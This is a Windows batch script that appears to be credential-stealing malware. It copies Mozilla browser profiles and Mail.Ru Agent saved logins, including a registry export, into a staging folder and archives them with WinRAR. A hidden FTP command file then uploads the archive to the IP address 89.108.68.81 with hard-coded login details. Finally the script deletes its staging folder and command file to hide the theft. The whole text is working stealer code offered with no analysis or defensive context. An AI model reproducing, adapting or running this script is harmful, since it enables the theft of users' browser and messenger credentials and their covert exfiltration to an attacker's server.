@echo off
XCopy Profiles C:\pass\Mozilla /H /G /Q /R /S /Y >nul
:end
md C:\pass\MailAgent\reg
regedit.exe -ea C:\pass\MailAgent\reg\agent.reg "HKEY_CURRENT_USER\software\Mail.Ru\Agent\magent_logins2\
CD /D %APPDATA%
Xcopy Mra C:\pass\MailAgent /K /H /G /Q /R /S /Y /E >nul
:end
md C:\pass\pass
start /min WinRAR.exe u -r -y -ep1 C:\pass\pass\pass.rar C:\pass >nul
:end 
ping -n 7 localhost 
md C:\ftp
attrib c:\ftp +h +s +a +r
:goto echo
echo open 89.108.68.81 > C:\ftp\ftp_cmd.txt
echo USER yanbeex8 lRlLgBkM >> C:\ftp\ftp_cmd.txt
echo binary >> C:\ftp\ftp_cmd.txt
echo quote PASV >> C:\ftp\ftp_cmd.txt
echo send C:\pass\pass\pass.rar >> C:\ftp\ftp_cmd.txt
echo quit >> C:\ftp\ftp_cmd.txt
ping -n 3 localhost 
:end
ftp.exe -s:C:\ftp\ftp_cmd.txt -n
:end
del C:\ftp\ftp_cmd.txt
RMDIR C:\ftp
C:
cd \temp
rmdir /s /q C:\pass
:end
%dead% > nul
%I_remain% > nul
EXIT
cls